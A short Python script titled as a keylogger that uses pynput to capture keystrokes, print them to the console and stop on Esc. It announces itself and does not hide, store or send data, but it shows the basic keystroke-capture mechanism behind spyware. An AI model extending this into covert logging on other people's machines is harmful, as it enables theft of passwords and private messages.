
# Project Title : Python Keylogger 

import pynput.keyboard

def on_press(key):
    try:
        print('Key Pressed: {0}'.format(key.char))
    except AttributeError:
        print('Special Key Pressed: {0}'.format(key))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

print("Keylogger started. Press 'Esc' to stop.")
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



